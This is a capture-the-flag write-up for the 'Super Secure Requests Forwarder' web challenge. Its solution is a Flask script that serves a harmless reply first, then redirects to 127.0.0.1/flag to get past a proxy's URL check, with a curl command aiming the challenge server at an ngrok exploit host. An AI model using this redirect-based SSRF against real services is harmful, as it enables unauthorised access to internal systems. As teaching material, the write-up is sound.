---
name: Super Secure Requests Forwarder (2022)
event: Social Engineering Experts CTF 2022
category: Web
description: Writeup for Super Secure Requests Forwarder (Web) - Social Engineering Experts CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Super Secure Requests Forwarder

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-cc4U1H53F8/0.jpg)](https://youtu.be/-cc4U1H53F8?t=4180 "Social Engineering Experts CTF 2022: Super Secure Requests Forwarder")

## Description

> Hide your IP address and take back control of your privacy! Visit websites through our super secure proxy.

## Solution

{% code overflow="wrap" %}
```py
from flask import Flask, redirect, request

# flask run
# ngrok http 5000
# curl -X POST -d "url=http://c0ac-81-103-153-174.ngrok.io/exploit" http://ssrf.chall.seetf.sg:1337/

app = Flask(__name__)
check = True

@app.route("/")
def index():
    return "<a href='https://www.youtube.com/c/CryptoCat23'>👀</a>"

@app.route("/exploit", methods=['GET', 'POST'])
def handle():
    global check
    if check:  # First request = benign
        check = False
        return "First request is benign, why wouldn't the second be?!"
    else:  # Second request = malicious
        check = True
        return redirect("http://127.0.0.1/flag", code=302)
```
{% endcode %}
